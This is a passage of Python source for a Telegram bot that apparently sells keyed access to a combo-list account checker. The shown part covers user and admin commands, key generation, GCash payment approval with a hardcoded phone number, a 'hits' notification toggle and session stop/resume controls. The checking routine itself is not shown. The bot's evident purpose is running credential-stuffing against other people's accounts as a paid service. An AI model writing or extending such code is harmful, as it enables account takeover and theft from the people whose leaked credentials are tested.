    is_adm=is_admin(tg.id,cfg); is_vip=ud.get("vip",False)
    custom_l=ud.get("custom_limit"); ml=cfg.get("max_lines_per_check")
    lim=custom_l or (cfg.get("vip_limit") if (is_vip or is_adm) else cfg.get("global_limit"))
    exp_s=fmt_expiry(ud.get("key_expires_at"))
    cd_on,cd_left=check_cooldown(uid,cfg)
    cd_s=f"{'%dh %dm'%(int(cd_left//60),int(cd_left%60)) if cd_left>=60 else '%dm'%int(cd_left)} left" if cd_on else "None"
    badge="👑 Admin" if is_adm else ("⭐ VIP" if is_vip else "👤 User")
    ban_s="🚫 BANNED" if ud.get("banned") else "✅ Active"
    note_s=f"\n{pe(1)} Note       : <i>{ud.get('note')}</i>" if ud.get("note") else ""
    await update.message.reply_text(
        f"{pe(5)} <b>My Profile</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Name       : <b>{tg.first_name}</b>\n"
        f"{pe(1)} Username   : @{tg.username or 'N/A'}\n"
        f"{pe(1)} ID         : <code>{tg.id}</code>\n"
        f"{pe(1)} Badge      : {badge}\n"
        f"{pe(1)} Status     : {ban_s}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Total Checked  : <code>{ud.get('total_checked',0):,}</code> {pe(2)}\n"
        f"{pe(1)} Sessions       : <code>{ud.get('sessions_count',0)}</code>\n"
        f"{pe(1)} Limit          : <code>{lim or 'Unlimited'}</code>\n"
        f"{pe(1)} Max/Session    : <code>{ml or 'Unlimited'}</code>\n"
        f"{pe(1)} Cooldown       : <code>{cd_s}</code>\n"
        f"{pe(1)} Key expires    : {exp_s}"
        f"{note_s}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Joined     : <code>{ud.get('joined','?')[:10]}</code>",
        parse_mode=ParseMode.HTML)

async def cmd_help(update, context):
    """Show help / command list."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    is_adm=is_admin(tg.id,cfg)
    user_cmds=(
        f"{pe(2)} <b>User Commands</b> {pe(2)}\n"
        f"{pe(1)} /start — Open bot & see your profile\n"
        f"{pe(1)} /redeem — Redeem an access key\n"
        f"{pe(1)} /myinfo — View your detailed profile\n"
        f"{pe(1)} /status — Check your active session\n"
        f"{pe(1)} /check — View live check stats\n"
        f"{pe(1)} /stop — Stop current checker\n"
        f"{pe(1)} /deletefile — Delete your combo file\n"
        f"{pe(1)} /myresultsfile — Get your result file\n"
        f"{pe(1)} /hitson · /hitsoff — Toggle hit notifications\n"
        f"{pe(1)} /clean — Delete bot messages in chat"
    )
    adm_cmds=(
        f"\n{pe_sep()}\n"
        f"{pe(3)} <b>Admin Commands</b> {pe(3)}\n"
        f"{pe(1)} /admin — Open admin panel\n"
        f"{pe(1)} /userinfo <id|@user> — User lookup\n"
        f"{pe(1)} /topusers — Leaderboard\n"
        f"{pe(1)} /sysinfo — System info\n"
        f"{pe(1)} /maintenance [on|off] — Toggle maintenance\n"
        f"{pe(1)} /setannouncement <text|off> — Set announcement\n"
        f"{pe(1)} /announcement — Show current announcement\n"
        f"{pe(1)} /setmlimit <n|off> — Set max lines/check\n"
        f"{pe(1)} /keyinfo <key> — Look up a key\n"
        f"{pe(1)} /batchkey <type> <dur> <count> [max_u] — Batch keys\n"
        f"{pe(1)} /usernote <id> <note> — Add note to user\n"
        f"{pe(1)} /setuserlimit <id> <n|off> — Per-user limit\n"
        f"{pe(1)} /stats — Full statistics\n"
        f"{pe(1)} /broadcast <msg> — Broadcast to all users\n"
        f"{pe(1)} /stopall · /continueall — Mass stop/resume"
    ) if is_adm else ""
    await update.message.reply_text(
        f"{pe(5)} <b>Bot Help</b> {pe(5)}\n{pe_sep()}\n{user_cmds}{adm_cmds}",
        parse_mode=ParseMode.HTML)

async def cmd_userinfo(update, context):
    """Admin: look up a user by ID or username."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        await update.message.reply_text(f"{pe(1)} Usage: /userinfo <code>user_id</code> or /userinfo <code>@username</code>", parse_mode=ParseMode.HTML); return
    q=args[0].lstrip("@"); users=load_users(); found_uid=None; found_ud=None
    for u,d in users.items():
        if q==u or q.lower()==d.get("username","").lower():
            found_uid=u; found_ud=d; break
    if not found_ud:
        await update.message.reply_text(f"{pe(1)} User <code>{q}</code> not found.", parse_mode=ParseMode.HTML); return
    is_vip=found_ud.get("vip",False); is_adm2=is_admin(int(found_uid),cfg)
    badge="👑 Admin" if is_adm2 else ("⭐ VIP" if is_vip else "👤 User")
    ban_s="🚫 BANNED" if found_ud.get("banned") else "✅ Active"
    note_s=f"\n{pe(2)} Note : <i>{found_ud.get('note')}</i>" if found_ud.get("note") else ""
    await update.message.reply_text(
        f"{pe(5)} <b>User Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Name     : <b>{found_ud.get('first_name','?')}</b>\n"
        f"{pe(1)} Username : @{found_ud.get('username','N/A')}\n"
        f"{pe(1)} ID       : <code>{found_uid}</code>\n"
        f"{pe(1)} Badge    : {badge}\n"
        f"{pe(1)} Status   : {ban_s}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Total Checked  : <code>{found_ud.get('total_checked',0):,}</code> {pe(2)}\n"
        f"{pe(1)} Sessions       : <code>{found_ud.get('sessions_count',0)}</code>\n"
        f"{pe(1)} Custom Limit   : <code>{found_ud.get('custom_limit') or 'Default'}</code>\n"
        f"{pe(1)} Key expires    : {fmt_expiry(found_ud.get('key_expires_at'))}\n"
        f"{pe(1)} Joined         : <code>{found_ud.get('joined','?')[:10]}</code>\n"
        f"{pe(1)} Last seen      : <code>{found_ud.get('last_seen','?')[:10]}</code>"
        f"{note_s}",
        parse_mode=ParseMode.HTML)

async def cmd_topusers(update, context):
    """Show top 10 users by accounts checked."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    users=load_users()
    top=sorted(users.items(), key=lambda x: x[1].get("total_checked",0), reverse=True)[:10]
    medals=["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    lines=[f"{pe(5)} <b>🏆 Top 10 Checkers</b> {pe(5)}\n{pe_sep()}"]
    for i,(uid2,ud2) in enumerate(top):
        fn2=ud2.get("first_name","?"); un2=ud2.get("username","")
        tc2=ud2.get("total_checked",0); badge2="⭐" if ud2.get("vip") else ""
        lines.append(f"{medals[i]} <b>{fn2}</b>{badge2}{' @'+un2 if un2 else ''}\n    Checked: <code>{tc2:,}</code>  Sessions: <code>{ud2.get('sessions_count',0)}</code>")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

async def cmd_sysinfo(update, context):
    """Admin: show system info."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    import platform
    mb=_get_rss_mb()
    uptime_s=int(time.time()-_railway_start); h,m_,s2=uptime_s//3600,(uptime_s%3600)//60,uptime_s%60
    try:
        with open("/proc/loadavg","r") as f: la=f.read().split()[:3]; load_s=f"1m:{la[0]} 5m:{la[1]} 15m:{la[2]}"
    except: load_s="N/A"
    try:
        with open("/proc/meminfo","r") as f:
            mi={l.split(":")[0]:int(l.split()[1]) for l in f if ":" in l and l.split()[1].isdigit()}
        total_mb=mi.get("MemTotal",0)//1024; free_mb=mi.get("MemAvailable",0)//1024
        mem_str=f"{total_mb-free_mb}MB/{total_mb}MB ({int((total_mb-free_mb)/total_mb*100)}%)" if total_mb else "N/A"
    except: mem_str=f"RSS:{mb:.0f}MB"
    with sessions_lock: live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    with _queue_lock: q=len(_checker_queue)
    await update.message.reply_text(
        f"{pe(5)} <b>🖥 System Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Process RAM : <code>{mb:.1f}MB</code> (limit: {_MEM_LIMIT_MB}MB)\n"
        f"{pe(1)} System RAM  : <code>{mem_str}</code>\n"
        f"{pe(1)} CPU Load    : <code>{load_s}</code>\n"
        f"{pe(1)} Uptime      : <code>{h}h {m_}m {s2}s</code>\n"
        f"{pe(1)} Python      : <code>{platform.python_version()}</code>\n"
        f"{pe(1)} Active      : <code>{live}</code> checkers\n"
        f"{pe(1)} Queue       : <code>{q}</code> waiting\n"
        f"{pe(1)} PID         : <code>{os.getpid()}</code>",
        parse_mode=ParseMode.HTML)

async def cmd_maintenance(update, context):
    """Admin: toggle or configure maintenance mode."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        cur="🔴 ON" if cfg.get("maintenance_mode") else "🟢 Off"
        await update.message.reply_text(
            f"{pe(2)} <b>Maintenance Mode</b>\n{pe_sep()}\n{pe(1)} Status: <b>{cur}</b>\n"
            f"{pe(1)} Message: <i>{cfg.get('maintenance_message','')}</i>\n{pe_sep()}\n"
            f"Usage: /maintenance on|off\n/maintenance message Your custom message here",
            parse_mode=ParseMode.HTML); return
    if args[0].lower()=="on":
        cfg["maintenance_mode"]=True; msg2=" ".join(args[1:])
        if msg2: cfg["maintenance_message"]=msg2
    elif args[0].lower()=="off":
        cfg["maintenance_mode"]=False
    elif args[0].lower()=="message":
        cfg["maintenance_message"]=" ".join(args[1:])
    else:
        await update.message.reply_text(f"{pe(1)} Use: on|off|message", parse_mode=ParseMode.HTML); return
    save_config(cfg)
    status="🔴 ENABLED" if cfg.get("maintenance_mode") else "🟢 DISABLED"
    await update.message.reply_text(
        f"{pe(5)} <b>Maintenance {status}</b> {pe(5)}\n{pe_sep()}\n"
        f"{pe(1)} Message: <i>{cfg.get('maintenance_message','')}</i>", parse_mode=ParseMode.HTML)

async def cmd_announcement(update, context):
    """Show current announcement."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    ann=cfg.get("announcement_text","").strip()
    if not ann:
        await update.message.reply_text(f"{pe(1)} No announcement set.", parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f"{pe(3)} <b>📢 Announcement</b> {pe(3)}\n{pe_sep()}\n{ann}", parse_mode=ParseMode.HTML)

async def cmd_set_announcement(update, context):
    """Admin: set or clear the announcement."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    text=" ".join(context.args).strip()
    if not text:
        await update.message.reply_text(f"{pe(1)} Usage: /setannouncement <code>Your text here</code>\nor /setannouncement off", parse_mode=ParseMode.HTML); return
    if text.lower()=="off": cfg["announcement_text"]=""
    else: cfg["announcement_text"]=text
    save_config(cfg)
    val=cfg["announcement_text"]
    await update.message.reply_text(
        f"{pe(3)} <b>Announcement {'Cleared' if not val else 'Set'}</b> {pe(3)}\n{pe_sep()}\n{val or 'No announcement set.'}",
        parse_mode=ParseMode.HTML)

async def cmd_set_mlimit(update, context):
    """Admin: set max lines per check session."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        await update.message.reply_text(
            f"{pe(2)} <b>Max Lines Per Check</b>\n{pe_sep()}\n"
            f"{pe(1)} Current: <code>{cfg.get('max_lines_per_check') or 'Unlimited'}</code>\n{pe_sep()}\n"
            f"Usage: /setmlimit <code>5000</code> or /setmlimit off", parse_mode=ParseMode.HTML); return
    val=args[0].lower()
    if val in ("off","0","none"): cfg["max_lines_per_check"]=None
    else:
        try: cfg["max_lines_per_check"]=max(1,int(val))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.", parse_mode=ParseMode.HTML); return
    save_config(cfg)
    await update.message.reply_text(
        f"{pe(3)} <b>Max Lines/Check Set</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(2)} Max lines per session: <code>{cfg.get('max_lines_per_check') or 'Unlimited'}</code> {pe(2)}",
        parse_mode=ParseMode.HTML)

async def cmd_keyinfo(update, context):
    """Admin: look up info about a specific key."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    if not context.args:
        await update.message.reply_text(f"{pe(1)} Usage: /keyinfo <code>KEY</code>", parse_mode=ParseMode.HTML); return
    k=context.args[0].strip(); keys=load_keys()
    if k not in keys:
        await update.message.reply_text(f"{pe(1)} Key <code>{k}</code> not found.", parse_mode=ParseMode.HTML); return
    kd=keys[k]; used=kd.get("used_by",[]); max_u=kd.get("max_users",1)
    exp=fmt_expiry(kd.get("expires_at")); dtype=kd.get("duration_type","?"); dval=kd.get("duration_val",0)
    created=kd.get("created_at","?")[:10]; cb=kd.get("created_by","?")
    users=load_users()
    user_lines=[]
    for ub in used:
        ud2=users.get(str(ub),{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","")
        user_lines.append(f"  {pe(1)} <code>{ub}</code> — {fn2}{' @'+un2 if un2 else ''}")
    await update.message.reply_text(
        f"{pe(5)} <b>Key Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Key       : <code>{k}</code>\n"
        f"{pe(1)} Type      : <code>{dtype} {dval if dtype!='lifetime' else ''}</code>\n"
        f"{pe(1)} Expires   : {exp}\n"
        f"{pe(1)} Used      : <code>{len(used)}/{max_u}</code>\n"
        f"{pe(1)} Created   : <code>{created}</code> by <code>{cb}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Users:\n" + "\n".join(user_lines if user_lines else [f"  {pe(1)} None yet"]),
        parse_mode=ParseMode.HTML)

async def cmd_batchkey(update, context):
    """Admin: generate multiple keys at once."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<3:
        await update.message.reply_text(
            f"{pe(2)} <b>Batch Key Generation</b>\n{pe_sep()}\n"
            f"Usage: /batchkey <code>type duration count [max_users]</code>\n\n"
            f"Example: /batchkey days 30 5 1\n"
            f"Types: hours, days, months, lifetime", parse_mode=ParseMode.HTML); return
    try:
        dtype=args[0]; dval=int(args[1]); count=min(int(args[2]),50); mu=int(args[3]) if len(args)>3 else 1
    except: await update.message.reply_text(f"{pe(1)} Invalid format.", parse_mode=ParseMode.HTML); return
    if dtype not in ("hours","days","months","lifetime"):
        await update.message.reply_text(f"{pe(1)} Type must be hours/days/months/lifetime.", parse_mode=ParseMode.HTML); return
    import uuid as _uuid3
    exp=compute_expiry(dtype,dval); keys=load_keys(); generated=[]
    dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
    for _ in range(count):
        k=f"MITZ-{_uuid3.uuid4().hex[:8].upper()}-{_uuid3.uuid4().hex[:4].upper()}"
        keys[k]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                 "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
        generated.append(k)
    save_keys(keys)
    key_lines="\n".join(f"<code>{k}</code>" for k in generated)
    await update.message.reply_text(
        f"{pe(5)} <b>🔑 {count} Keys Generated!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Duration  : <b>{dd}</b>\n"
        f"{pe(1)} Max Users : <code>{mu}</code> each\n"
        f"{pe_sep()}\n{key_lines}", parse_mode=ParseMode.HTML)

async def cmd_usernote(update, context):
    """Admin: add a note to a user."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<2:
        await update.message.reply_text(f"{pe(1)} Usage: /usernote <code>user_id note text here</code>", parse_mode=ParseMode.HTML); return
    target=args[0]; note=" ".join(args[1:])
    users=load_users()
    if target not in users:
        await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.", parse_mode=ParseMode.HTML); return
    if note.lower()=="clear": users[target]["note"]=""
    else: users[target]["note"]=note
    save_users(users)
    await update.message.reply_text(
        f"{pe(3)} <b>Note {'Cleared' if note.lower()=='clear' else 'Saved'}</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(1)} User : <code>{target}</code>\n{pe(1)} Note : <i>{users[target].get('note','')or'(cleared)'}</i>",
        parse_mode=ParseMode.HTML)

async def cmd_set_user_limit(update, context):
    """Admin: set or clear a per-user custom limit."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<2:
        await update.message.reply_text(f"{pe(1)} Usage: /setuserlimit <code>user_id limit</code> or <code>off</code>", parse_mode=ParseMode.HTML); return
    target=args[0]; val=args[1].lower()
    users=load_users()
    if target not in users:
        await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.", parse_mode=ParseMode.HTML); return
    if val in ("off","0","none"): users[target]["custom_limit"]=None
    else:
        try: users[target]["custom_limit"]=max(1,int(val))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.", parse_mode=ParseMode.HTML); return
    save_users(users)
    new_lim=users[target].get("custom_limit")
    await update.message.reply_text(
        f"{pe(3)} <b>User Limit Set</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(1)} User  : <code>{target}</code>\n{pe(2)} Limit : <code>{new_lim or 'Default'}</code> {pe(2)}",
        parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  CALLBACK HANDLER
# ════════════════════════════════════════════
async def on_callback(update,context):
    query=update.callback_query; await query.answer()
    cfg=load_config(); tg=query.from_user; uid=str(tg.id); data=query.data

    # delete_all_msgs
    if data=="delete_all_msgs":
        await query.answer(" Deleting…")
        with bot_msg_lock: ids=list(bot_messages.get(uid,[]))
        if query.message and query.message.message_id not in ids: ids.append(query.message.message_id)
        d=f=0
        for mid in ids:
            try: await context.bot.delete_message(chat_id=query.message.chat_id,message_id=mid); d+=1
            except: f+=1
            await asyncio.sleep(0.05)
        with bot_msg_lock: bot_messages.pop(uid,None)
        try:
            c=await context.bot.send_message(chat_id=query.message.chat_id,
                text=f" Deleted <b>{d}</b> message(s).\n<i>Self-destructing in 5s…</i>",parse_mode=ParseMode.HTML)
            await asyncio.sleep(5); await c.delete()
        except: pass
        return

    # ── GCash: show plans inline ─────────────────────────────────────────
    if data == "gcash_buy":
        cfg2 = load_config()
        gcash_num  = cfg2.get("gcash_number","09943470058")
        gcash_name = cfg2.get("gcash_name","JA...R KA.L T.")
        await query.edit_message_text(
            f"{pe(5)} <b>BUY A KEY — GCash</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Piliin ang plan mo! {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} 🔑 3 Days    — ₱50\n"
            f"{pe(2)} 🔑 7 Days    — ₱70\n"
            f"{pe(2)} 🔑 1 Month   — ₱100\n"
            f"{pe(3)} 💎 Lifetime  — ₱150\n"
            f"{pe_sep()}\n"
            f"{pe(1)} I-tap ang plan para sa payment steps!",
            parse_mode=ParseMode.HTML, reply_markup=kb_gcash_plans())
        return

    # ── GCash: user selected a plan ──────────────────────────────────────
    if data.startswith("gcash_sel:"):
        plan_key = data.split(":", 1)[1]
        plan = GCASH_PLANS.get(plan_key)
        if not plan:
            await query.answer("Unknown plan.", show_alert=True); return
        cfg2 = load_config()
        gcash_num  = cfg2.get("gcash_number","09943470058")
        gcash_name = cfg2.get("gcash_name","JA...R KA.L T.")
        # Save awaiting state
        with sessions_lock:
            if uid not in active_sessions: active_sessions[uid] = {}
            active_sessions[uid]["awaiting_receipt"] = plan_key
        await query.edit_message_text(
            f"{pe(5)} <b>PAYMENT STEPS</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Plan     : <b>{plan['label']}</b> {pe(3)}\n"
            f"{pe(2)} Bayad    : <b>{plan['price']}</b> {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} <b>PAANO MAGBAYAD:</b> {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(1)} 1️⃣  I-open ang GCash app\n"
            f"{pe(1)} 2️⃣  Send Money → <b><code>{gcash_num}</code></b>\n"
            f"{pe(1)} 3️⃣  Amount: <b>{plan['price']}</b>\n"
            f"{pe(1)} 4️⃣  Name: <b>{gcash_name}</b>\n"
            f"{pe(1)} 5️⃣  Kunan ng screenshot ang resibo\n"
            f"{pe(1)} 6️⃣  I-send dito bilang <b>PHOTO</b> (hindi file!)\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Mag-send ng resibo photo ngayon! {pe(3)}\n"
            f"{pe(1)} <i>Admin will approve within 5–30 minutes.</i>",
            parse_mode=ParseMode.HTML)
        return

    # ── GCash: admin approves payment ────────────────────────────────────
    if data.startswith("gcash_approve:"):
        if not is_admin(tg.id, cfg):
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        # Generate and assign key
        from secrets import token_hex as _th
        new_key = f"MITZ-{_th(4).upper()}-{_th(4).upper()}"
        keys = load_keys()
        exp_iso = compute_expiry(plan.get("dtype","days"), plan.get("dval",1))
        keys[new_key] = {
            "dtype": plan.get("dtype","days"),
            "dval": plan.get("dval",1),
            "expires_at": exp_iso,
            "max_users": 1,
            "used_by": [buyer_uid],
            "vip": False,
            "note": f"GCash purchase {plan.get('label','')}",
        }
        save_keys(keys)
        # Activate user
        users = load_users()
        bu = users.setdefault(buyer_uid, {})
        bu["activated"] = True
        bu["key_used"]  = new_key
        bu["key_expires_at"] = exp_iso
        bu["activated_at"] = datetime.now().isoformat()
        bu["key_expired"] = False
        save_users(users)
        # Notify buyer
        try:
            await context.bot.send_message(
                chat_id=int(buyer_uid),
                text=(
                    f"{pe(5)} <b>APPROVED! KEY ACTIVATED!</b> {pe(5)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(3)} Plan   : <b>{plan.get('label','')}</b> {pe(3)}\n"
                    f"{pe(2)} Key    : <code>{new_key}</code> {pe(2)}\n"
                    f"{pe(2)} Expiry : {fmt_expiry(exp_iso)} {pe(2)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(5)} Salamat sa pagbili! {pe(5)}\n"
                    f"{pe(1)} Tap /start para magsimula!"
                ),
                parse_mode=ParseMode.HTML)
        except Exception as _ne:
            log.warning(f"Could not notify buyer {buyer_uid}: {_ne}")
        await query.edit_message_caption(
            caption=(
                f"{pe(3)} ✅ APPROVED — {plan.get('label','')} {pe(3)}\n"
                f"Key: <code>{new_key}</code>\n"
                f"Buyer: <code>{buyer_uid}</code>"
            ),
            parse_mode=ParseMode.HTML)
        return

    # ── GCash: admin denies payment ───────────────────────────────────────
    if data.startswith("gcash_deny:"):
        if not is_admin(tg.id, cfg):
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        try:
            await context.bot.send_message(
                chat_id=int(buyer_uid),
                text=(
                    f"{pe(3)} <b>PAYMENT DENIED</b> {pe(3)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(2)} Plan: <b>{plan.get('label','')}</b> {pe(2)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(1)} Di ma-verify ang iyong resibo.\n"
                    f"{pe(1)} Subukan ulit o makipag-ugnayan sa admin.\n"
                    f"{pe_sep()}\n"
                    f"{pe(2)} Tap <b>🛒 Buy Key</b> para subukan ulit. {pe(2)}"
                ),
                parse_mode=ParseMode.HTML, reply_markup=kb_no_key())
        except Exception as _ne:
            log.warning(f"Could not notify buyer {buyer_uid} of denial: {_ne}")
        await query.edit_message_caption(
            caption=(
                f"{pe(1)} ❌ DENIED — {plan.get('label','')} for <code>{buyer_uid}</code>"
            ),
            parse_mode=ParseMode.HTML)
        return

    # ── Continue or stop from /stop prompt ──────────────────────────────
    if data=="stop_continue":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if not s2 or s2.get("status")!="checking":
            await query.answer("ℹ No active session.",show_alert=True); return
        # Mark as continue — bg() will see this flag and re-launch
        with sessions_lock:
            active_sessions[uid]["stop_continue"]=True
        # Actually set the stop event to interrupt current run
        s2.get("stop_event",threading.Event()).set()
        await query.edit_message_text(
            f"{pe(5)} <b>Continuing!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Partial results sent now, checking continues! {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} /check for live stats  |  /stop to stop {pe(2)}",
            parse_mode=ParseMode.HTML)
        return

    if data=="stop_confirm":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if not s2 or s2.get("status")!="checking":
            await query.answer("ℹ No active session.",show_alert=True); return
        with sessions_lock: active_sessions[uid]["stop_continue"]=False
        s2.get("stop_event",threading.Event()).set()
        clear_persisted_session(uid)
        await query.edit_message_text(
            f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Results will be zipped and sent automatically. {pe(2)}",
            parse_mode=ParseMode.HTML)
        return

    # ── Admin stop/continue callbacks ────────────────────────────────────
    if data.startswith("admstop_") or data.startswith("admcont_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return

        if data=="admstop_all":
            await query.answer(" Stopping all…")
            await _adm_stop_by_filter(query.message, context.bot, "all")
            await query.delete_message()
            return
        if data=="admstop_vip":
            await query.answer(" Stopping VIP…")
            await _adm_stop_by_filter(query.message, context.bot, "vip")
            await query.delete_message()
            return
        if data=="admstop_nonvip":
            await query.answer(" Stopping non-VIP…")
            await _adm_stop_by_filter(query.message, context.bot, "nonvip")
            await query.delete_message()
            return
        if data=="admstop_oneuser":
            # Show per-user stop buttons
            with sessions_lock:
                running=[(u2,dict(s)) for u2,s in active_sessions.items() if s.get("status")=="checking"]
            if not running:
                await query.answer(" No running sessions.",show_alert=True); return
            users_db2=load_users(); btns2=[]
            for u2,s2 in running:
                ud2=users_db2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
                vt2="" if ud2.get("vip") else ""
                btns2.append([InlineKeyboardButton(f" {vt2} {fn2} @{un2}",callback_data=f"admstop_uid_{u2}")])
            btns2.append([InlineKeyboardButton("« Back",callback_data="admstop_back")])
            await query.edit_message_text(" <b>Stop One User</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose:",
                reply_markup=InlineKeyboardMarkup(btns2),parse_mode=ParseMode.HTML)
            return
        if data.startswith("admstop_uid_"):
            target_uid=data[len("admstop_uid_"):]
            await query.answer(f" Stopping {target_uid}…")
            await _adm_stop_by_filter(query.message, context.bot, f"uid:{target_uid}")
            await query.delete_message()
            return
        if data=="admstop_back":
            # Re-show the main stop menu
            with sessions_lock:
                running2=[(u2,s) for u2,s in active_sessions.items() if s.get("status")=="checking"]
            users_db3=load_users()
            vip_c=sum(1 for u2,_ in running2 if users_db3.get(u2,{}).get("vip"))
            nvip_c=len(running2)-vip_c
            kb_b=InlineKeyboardMarkup([
                [InlineKeyboardButton(f" Stop ALL ({len(running2)})",    callback_data="admstop_all")],
                [InlineKeyboardButton(f" Stop Non-VIP ({nvip_c})",       callback_data="admstop_nonvip"),
                 InlineKeyboardButton(f" Stop VIP ({vip_c})",            callback_data="admstop_vip")],
                [InlineKeyboardButton(f" Stop One User…",                callback_data="admstop_oneuser")],
            ])
            await query.edit_message_text(
                f" <b>Stop Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Running: <code>{len(running2)}</code>",
                reply_markup=kb_b,parse_mode=ParseMode.HTML)
            return

        # Continue callbacks
        if data=="admcont_all":
            await query.answer(" Resuming all…")
            await _adm_continue_by_filter(query, context.bot, "all")
            return
        if data=="admcont_vip":
            await query.answer(" Resuming VIP…")
            await _adm_continue_by_filter(query, context.bot, "vip")
            return
        if data=="admcont_nonvip":
            await query.answer(" Resuming non-VIP…")
            await _adm_continue_by_filter(query, context.bot, "nonvip")
            return
        if data=="admcont_oneuser":
            with sessions_lock:
                stopped2=[(u2,dict(s)) for u2,s in active_sessions.items()
                          if s.get("status")=="stopped_by_admin" and s.get("file") and Path(s["file"]).exists()]
            if not stopped2:
                await query.answer(" No stopped sessions.",show_alert=True); return
            users_db4=load_users(); btns3=[]
            for u2,s2 in stopped2:
                ud3=users_db4.get(u2,{}); fn3=ud3.get("first_name","?"); un3=ud3.get("username","?")
                vt3="" if ud3.get("vip") else ""
                btns3.append([InlineKeyboardButton(f" {vt3} {fn3} @{un3}",callback_data=f"admcont_uid_{u2}")])
            await query.edit_message_text(" <b>Continue One User</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose:",
                reply_markup=InlineKeyboardMarkup(btns3),parse_mode=ParseMode.HTML)
            return
        if data.startswith("admcont_uid_"):
            target_uid2=data[len("admcont_uid_"):]
            await query.answer(f" Resuming {target_uid2}…")
            await _adm_continue_by_filter(query, context.bot, f"uid:{target_uid2}")
            return
        return

    # ── Admin stop/continue session buttons ──────────────────────────────
    if data.startswith("admin_stop_user_") or data.startswith("admin_cont_user_")             or data in ("admin_stop_all","admin_continue_all","admin_continue_vip","admin_continue_nonvip"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        loop2=asyncio.get_event_loop()
        users_db2=load_users()

        if data=="admin_stop_all":
